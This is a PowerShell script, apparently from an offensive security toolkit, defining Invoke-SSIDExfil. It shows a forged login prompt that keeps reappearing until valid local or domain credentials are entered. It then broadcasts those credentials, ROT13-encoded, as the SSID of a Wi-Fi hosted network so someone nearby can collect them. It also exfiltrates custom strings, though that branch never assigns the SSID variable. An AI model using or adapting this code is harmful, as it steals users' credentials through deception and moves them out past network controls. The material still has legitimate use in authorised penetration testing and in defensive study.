
function Invoke-SSIDExfil
{
<#
.SYNOPSIS
Nishang script which can exfiltrate information like user credentials, using WLAN SSID.

.DESCRIPTION
In the default operation (without any option), the script opens a prompt which asks for user credentials and does not go away till valid local or domain credentials are entered in the prompt.
The credentials are encoded using ROT13 and a Hosted Network is started with the SSID set to the encoded credentials. 
If the target is in proximity, the SSID can be noted and decoded using the same script. 

The script needs to be run from elevated shell to configure and start a hosted network.

It is also possible to Exfiltrate data - limited up to 32 bytes - other then the user credentials.

.PARAMETER MagicString
The string which Gupt would compare with the available SSIDs. 

.PARAMETER Arguments
Arguments to pass to a downloaded script.

.EXAMPLE
PS > Invoke-SSIDExfil
Use above command to show a credentials prompt to the target user. A Hosted Network with SSID set to ROT13
encoding of credentials will be started. 

PS > Invoke-SSIDExfil -ExfilOnly -StringToExfiltrate supersecret
Use above command to exfiltrate a custom string.

PS > Invoke-SSIDExfil -Decode -StringToDecode fhcrefrperg
Use above command to decode a string exfiltrated by the script.

.LINK
http://www.labofapenetrationtester.com/2016/11/exfiltration-of-user-credentials-using-wlan-ssid.html
https://github.com/samratashok/nishang
#>

    [CmdletBinding()] param(
        [Parameter(Position = 0, Mandatory = $False, ValueFromPipeline = $True)]
        [String]
        $StringToDecode,

        [Parameter(Position = 1, Mandatory = $False, ValueFromPipeline = $True)]
        [String]
        $StringToExfiltrate,

        [Switch]
        $ExfilOnly,
                
        [Switch]
        $Decode
     )

    $ErrorActionPreference="SilentlyContinue"
    Add-Type -assemblyname system.DirectoryServices.accountmanagement 
    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    $domainDN = "LDAP://" + ([ADSI]"").distinguishedName

    #ROT13 code From learningpcs.blogspot.com/2012/06/powershell-v2-function-convertfrom.html
    function ConvertTo-ROT13
    {
    param(
          [Parameter(Mandatory = $False)]
          [String]
          $rot13string
     )
        [String] $string = $null;
        $rot13string.ToCharArray() | ForEach-Object {
            if((([int] $_ -ge 97) -and ([int] $_ -le 109)) -or (([int] $_ -ge 65) -and ([int] $_ -le 77)))
            {
                $string += [char] ([int] $_ + 13);
            }
            elseif((([int] $_ -ge 110) -and ([int] $_ -le 122)) -or (([int] $_ -ge 78) -and ([int] $_ -le 90)))
            {
                $string += [char] ([int] $_ - 13);
            }
            else
            {
                $string += $_
            }
        }
        $string
    }

    if ($Decode -eq $True)
    {
        Write-Verbose "Decoding the exfiltrated value."
        ConvertTo-ROT13 -rot13string $StringToDecode
    }

    elseif($ExfilOnly -eq $True)
    {
        Write-Verbose "Exfiltrating the data."
        if ($StringToExfiltrate.Length -gt 32)
        {
            Write-Warning "The data is too long for SSID name. It can only be 32 bytes long. Aborting.."
            break
        }
        else
        {
            Write-Verbose "Exfiltrating the data."
            ConvertTo-ROT13 -rot13string $StringToExfiltrate
            Write-Verbose "Setting the hosted network SSID to $ssidname."
            netsh wlan set hostednetwork mode=allow ssid=`"$ssidname`" key='HardtoGuess!@#123'
            Write-Verbose "Startig the hosted network SSID $ssidname."
            netsh wlan start hostednetwork
            break
        }
    }
    else
    {
        while($true)
        {
            #Displaying a forged login prompt to the user.
            $credential = $host.ui.PromptForCredential("Credentials are required to perform this operation", "Please enter your user name and password.", "", "")
            if($credential)
            {
                $creds = $credential.GetNetworkCredential()
                [String]$user = $creds.username
                [String]$pass = $creds.password
                [String]$domain = $creds.domain

                #Check for validity of credentials locally and with domain.
                $authlocal = $DS.ValidateCredentials($user, $pass)
                $authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass)
                if(($authlocal -eq $true) -or ($authdomain.name -ne $null))
                {

                    $output = $authdomain.name + ":" + $user + ":" + $pass       
                    $ssidname = ConvertTo-ROT13 -rot13string $output

                    Write-Verbose "Setting the hosted network SSID to $ssidname in the form Domain:Username:Password."
                    netsh wlan set hostednetwork mode=allow ssid=`"$ssidname`" key='HardtoGuess!@#123'
                    Write-Verbose "Startig the hosted network SSID $ssidname."
                    netsh wlan start hostednetwork
                    break
                }
            }
        }
    }
}


